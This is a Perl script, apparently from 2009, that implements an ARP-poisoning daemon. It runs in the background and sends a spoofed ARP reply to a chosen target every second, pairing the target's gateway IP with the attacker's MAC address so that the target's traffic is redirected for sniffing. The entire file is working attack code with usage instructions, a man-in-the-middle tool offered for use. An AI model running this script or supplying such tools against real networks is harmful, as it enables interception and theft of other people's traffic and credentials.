#!/usr/bin/perl -W 
#######################################################################
#   This daemon program will send continuous poisoned arp packets to the 
#   target.  The packets contains the fake matching pair of MAC and IP.
#   For example, the MAC address of attacker's sniffer and target's 
#   internet gateway IP. Thus the target host would be confused to send 
#   information destinated for internet to attacker's sniffer mac 
#   address instead. 
#
#
#      --  Inspired by Dug Song's famous DSNIFF package     
# 
#       Writen by Yang Li 
#		version        0.1
#		
#		07/30/2009     refine program input / output
#		07/28/2009     redefine daemon initialization process
#		07/23/2009     daemon log process define
#		07/22/2009     basic process define
#
#######################################################################
#######################################################################
use strict;
use warnings;
use Proc::PID::File;
use POSIX qw(setsid);
use Log::Dispatch;
use Log::Dispatch::File;
use Date::Format;
use File::Spec;
use Net::ARP;
use Net::Ping;
use Getopt::Long qw/:config bundling_override no_ignore_case/;
use constant LOG_DIR    => '/var/log';
use constant PIDDIR     => '/var/run';

#######################################################################
# Script argument checK
#

my %opts;
GetOptions(
	\%opts,
	'help|h|?' => sub { &print_help and exit; },    # print help
	'dev|d:s',				# optional device, default to 'eth0'
	'target|t:s',				# target ip
	'source|s:s',				# source ip, target's gateway by norm
	'mac|m:s',				# spoof mac, dev's mac by default 
);

my $dev=defined $opts{dev} ? $opts{dev} : 'eth0';
my $targetIp=$opts{target};
my $targetMac=&ip_to_mac($dev, $targetIp);
my $sourceIp=$opts{source};
my $spoofMac=defined $opts{mac} ? $opts{mac} : Net::ARP::get_mac($dev);

die "'target' IP is not defined\n" if(not defined $opts{target});
die "'source' IP is not defined\n" if(not defined $opts{source});
die "'target' IP format error\n" if($opts{target} !~ m/^\d+\.\d+\.\d+\.\d+$/);
die "'source' IP format error\n" if($opts{source} !~ m/^\d+\.\d+\.\d+\.\d+$/);

#print "targetMac: $targetMac  - spoofMac: $spoofMac\n";
########################################################################

########################################################################
# Fork and start daemon process
#
our $ME = $0; $ME =~ s/\.\///; 
our $PIDFILE = PIDDIR."/$ME.pid";
our $LOG_FILE = "/$ME.log";
&startDaemon ($PIDFILE);


########################################################################
#
# Setup a logging agent
#
our $HOSTNAME = `hostname`;
chomp $HOSTNAME;
my $log = new Log::Dispatch(
      callbacks => sub { my %h=@_; return Date::Format::time2str('%B %e %T', time)." ".$HOSTNAME." $0\[$$]: ".$h{message}."\n"; }
);
$log->add( Log::Dispatch::File->new( name      => 'file1',
                                     min_level => 'warning',
                                     mode      => 'append',
                                     filename  => File::Spec->catfile(LOG_DIR, $LOG_FILE),
                                   )
);
$log->warning("Starting Processing:  ".time());


########################################################################
#
# Setup signal handlers to handle daemon shutdown
#
my $keep_going = 1;
$SIG{HUP}  = sub { $log->warning("Caught SIGHUP:  exiting gracefully"); stopDaemon($PIDFILE); };
$SIG{INT}  = sub { $log->warning("Caught SIGINT:  exiting gracefully"); stopDaemon($PIDFILE); };
$SIG{QUIT} = sub { $log->warning("Caught SIGQUIT:  exiting gracefully"); stopDaemon($PIDFILE); };
$SIG{TERM} = sub { $log->warning("Caught SIGTERM:  exiting gracefully"); stopDaemon($PIDFILE); };


########################################################################
# Enter main loop
########################################################################
#
while ($keep_going) {
	print "Sending poinson ARP packet to $targetIp ...\n" || die "Problem seding out poison packet: $!";
	&arpoison ($targetIp, $targetMac, $sourceIp, $spoofMac, $dev);
	sleep(1); 
}

# Mark a clean exit in the log
$log->warning("Stopping Processing:  ".time());


########################################################################
# Functions & routines
#######################################################################
#
sub startDaemon () {

  #
  # Fork and detach from the parent process
  #
  	my $PIDFILE=$_[0];
	print "starting the daemon ...\n"; 
	chdir '/' || die "Can't chdir to /: $!";
	umask 022;
	open STDIN, '/dev/null' || die "Can't read /dev/null: $!";
	#open STDOUT, '>>/dev/null' || die "Can't read /dev/null: $!";
	open STDERR, '>>/var/log/messages' || die "Can't write to /var/log/messages: $!";
	defined (my $pid = fork) || die "Can't fork: $!";
	if ($pid) {			# set PID file
  		# Set a PID file
  		# umask 022;
		open FD, '>', $PIDFILE || die "Can't create a PID file: $!";
		#print "My daemon id is: $pid\n";
		print FD $pid;
		close FD || die "Can't close PID file: $!";
		#return $pid;
		exit; 			# exit parent shell
	}
	setsid || die "Can't start a new session: $!";
	#  dienice("$0 is lready running!") if hold_pid_file($PIDFILE);
}


sub stopDaemon () {
  #
  # cleanup before process exit
  #
	my $PIDFILE=$_[0];
	print "stoping the daemon ...\n";
	$keep_going=0;
	open FD, $PIDFILE || die "Can't open the PID file: $!";
	chomp(my $pid=<FD>);
	close FD;
	if ($$==$pid) { 
		unlink $PIDFILE || die "Problem unlink $PIDFILE: $!";
	}
}


sub dienice ($) {
  #
  # write die messages to the log before die'ing
  #
	my ($package, $filename, $line) = caller;
	$log->critical("$_[0] at line $line in $filename");
	die $_[0];
}


sub arpoison () {
  #
  # generate spoof ARP packet
  #
	print "Poison packet detail:  ARP Type: 'reply' -  Device: $dev - SrcIP: $_[2] - DstIP: $_[0] SrcMac: $_[3] DstMac: $_[1]\n";
        Net::ARP::send_packet($_[4],                 # Device
                               $_[2],          # Source IP
                               $_[0],          # Destination IP
                               $_[3],              # Source MAC
                               $_[1],          # Destinaton MAC
                               'reply');             # ARP operation
}

sub ip_to_mac () {
  #
  # perform ARP lookup
  #
       	$dev = "$_[0]";
        my $ping=Net::Ping->new();
	$ping->ping($_[1],1);
        my $rmac = Net::ARP::arp_lookup($dev,$_[1]);
        return $rmac;
}

sub print_help {
  #
  # print help for user
  # 
	my $ph = (split /[\\|\/]/, $0)[-1];    
	print <<HELP
	
	>$ph ?|-h|--help
		-h|?|help		print help message
		-d|dev:s		ethernet device, 'eth0' by default
		-t|target:s		target IP address
		-s|spoof:s		spoof IP address, target's internet gateway by norm
		-m|mac:s		spoof mac address, default to attacker's ethernet device 

	for example:
	>$ph -d eth0 -t 192.9.101.151 -s 192.9.101.202 -m ab:ab:ab:ab:ab:ab 
HELP
}
